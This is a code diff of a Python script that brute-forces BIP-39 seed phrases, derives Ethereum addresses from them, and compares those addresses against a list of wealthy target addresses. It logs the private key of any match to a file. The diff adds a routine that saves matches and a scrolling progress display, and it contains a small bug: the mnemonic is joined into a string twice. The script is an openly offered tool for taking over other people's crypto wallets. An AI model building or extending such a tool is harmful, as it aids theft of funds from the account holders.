@@ -1,34 +1,16 @@
 import os
 import concurrent.futures
+import sys
 from itertools import product
-
-# Get the absolute path to the script directory
-SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-WORDLIST_PATH = os.path.join(SCRIPT_DIR, "bip39_wordlist.txt")
-
-# Ensure the wordlist file exists
-if not os.path.exists(WORDLIST_PATH):
-    raise FileNotFoundError(f"Error: bip39_wordlist.txt not found at {WORDLIST_PATH}")
+from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
+from eth_utils import to_checksum_address
+from web3 import Web3
 
 # Load BIP-39 wordlist
-with open(WORDLIST_PATH, "r") as f:
-    bip39_wordlist = [word.strip() for word in f.readlines()]
-
-# Other code...
-
-
-# Get the absolute path to the script directory
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 WORDLIST_PATH = os.path.join(SCRIPT_DIR, "bip39_wordlist.txt")
-
-# Ensure the wordlist file exists
-if not os.path.exists(WORDLIST_PATH):
-    raise FileNotFoundError(f"Error: bip39_wordlist.txt not found at {WORDLIST_PATH}")
-
-# Load BIP-39 wordlist
 with open(WORDLIST_PATH, "r") as f:
     bip39_wordlist = [word.strip() for word in f.readlines()]
-
 
 # Load target Ethereum addresses
 with open("ethrichlist.txt", "r") as f:
@@ -43,15 +25,27 @@ def generate_eth_address(mnemonic):
     eth_address = to_checksum_address(pub_key)
     return mnemonic, priv_key, eth_address
 
+def save_matches_to_file(mnemonic, priv_key, eth_address):
+    """Save matching mnemonic, private key, and Ethereum address to a file."""
+    with open("found_matches.txt", "a") as f:
+        f.write(f"Mnemonic: {mnemonic}\nPrivate Key: {priv_key}\nEthereum Address: {eth_address}\n\n")
+
+def display_scrolling_mnemonic(mnemonic_words):
+    """Display the current mnemonic as a scrolling text in the console."""
+    mnemonic = " ".join(mnemonic_words)
+    sys.stdout.write("\r" + "Checking mnemonic: " + mnemonic)
+    sys.stdout.flush()
+
 def check_mnemonic(mnemonic_words):
     """Generate and check mnemonic against target addresses."""
     mnemonic = " ".join(mnemonic_words)
+    display_scrolling_mnemonic(mnemonic)  # Display scrolling mnemonic
+
     _, priv_key, eth_address = generate_eth_address(mnemonic)
     
     if eth_address.lower() in TARGET_ADDRESSES:
-        print(f"Match found! Mnemonic: {mnemonic} | Private Key: {priv_key} | Address: {eth_address}")
-        with open("found_mnemonics.txt", "a") as f:
-            f.write(f"{mnemonic}\n{priv_key}\n{eth_address}\n\n")
+        print(f"\nMatch found! Mnemonic: {mnemonic} | Private Key: {priv_key} | Address: {eth_address}")
+        save_matches_to_file(mnemonic, priv_key, eth_address)  # Save match to file
 
 def parallel_search(batch_size=1000):
     """Parallelized mnemonic phrase search."""
